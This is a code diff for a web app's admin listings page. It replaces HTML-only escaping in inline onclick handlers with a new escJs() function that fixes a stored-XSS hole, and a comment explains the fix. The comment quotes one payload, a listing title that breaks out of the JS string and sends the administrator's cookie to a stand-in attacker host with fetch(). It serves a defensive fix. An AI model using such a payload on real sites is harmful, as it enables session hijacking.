@@ -1028,6 +1028,43 @@ function esc(s) {
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
                   .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
 }
+
+// escJs(s) -- the escaper for a value interpolated into a JS string literal
+// that itself lives inside an HTML event attribute, e.g.
+//   onclick="deleteListing('ID','TITLE')"
+//
+// esc() is WRONG here and was a real stored-XSS vector (audit 2026-08-17).
+// Two parsers read that text in sequence: the HTML parser decodes entities
+// FIRST, then hands the decoded string to the JS parser. esc() turns ' into
+// &#39;, which the HTML parser faithfully decodes back into a real apostrophe
+// -- and that apostrophe closes the JS string literal. A listing title of
+//   ');fetch('https://attacker/'+document.cookie);//
+// therefore executed as script in the administrator's own MFA-verified
+// session: the one account with write access to every table and both storage
+// buckets. Listing prose is not typed-by-hand-only either; it arrives from
+// Smart Import / the Facebook adapter / AI generation, i.e. from text an
+// outsider can influence.
+//
+// The fix escapes for BOTH parsers, in the order they run:
+//   1. JS layer  -- backslash first, then the quote, then line terminators,
+//      so nothing can terminate the literal or start a new statement.
+//   2. HTML layer -- '&' first (so no entity the attacker writes can decode
+//      into a quote later), then the attribute delimiter and angle brackets.
+// The single quotes produced in step 1 are left as literal backslash-quote:
+// the attribute is delimited by ", so a raw ' is inert to the HTML parser and
+// survives decoding as an escaped quote for the JS parser. Verified in
+// xss-inline-handlers.test.js against a real HTML attribute-value decoder.
+function escJs(s) {
+  if (s == null) return '';
+  return String(s)
+    .replace(/\\/g, '\\\\')
+    .replace(/'/g, "\\'")
+    .replace(/\r/g, '\\r').replace(/\n/g, '\\n')
+    .replace(/\u2028/g, '\\u2028').replace(/\u2029/g, '\\u2029')
+    .replace(/&/g, '&amp;')
+    .replace(/"/g, '&quot;')
+    .replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
 const ADMIN_EMAIL   = 'cyrora.trading@gmail.com';  // the ONLY account authorized for admin access
 const sbClient      = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
 
@@ -3106,9 +3143,9 @@ async function loadListings() {
       <td><span class="status-badge status-${marketStatusCls}">${marketStatusCls.replace(/_/g,' ')}</span>${isDraft ? ` <span class="status-badge status-draft">${esc(p.workflow_status)}</span>` : ''}</td>
       <td style="white-space:nowrap;font-size:12px;color:var(--ink-muted);"><span style="color:var(--ink);">${v}</span> views · <span style="color:var(--teal);font-weight:600;">${l}</span> leads${v > 0 ? ` <span style="opacity:0.6;">(${conv}%)</span>` : ''}</td>
       <td style="display:flex;gap:6px;align-items:center;">
-        <button class="action-btn btn-edit" onclick="editListing('${esc(p.id)}')">Edit</button>
+        <button class="action-btn btn-edit" onclick="editListing('${escJs(p.id)}')">Edit</button>
         <a class="action-btn btn-view" href="listing.html?${p.slug ? 'slug='+encodeURIComponent(p.slug) : 'id='+encodeURIComponent(p.id)}" target="_blank">View</a>
-        <button class="action-btn btn-delete" onclick="deleteListing('${esc(p.id)}','${esc(p.title_en||'')}')">Delete</button>
+        <button class="action-btn btn-delete" onclick="deleteListing('${escJs(p.id)}','${escJs(p.title_en||'')}')">Delete</button>
       </td>
     </tr>`;
   });
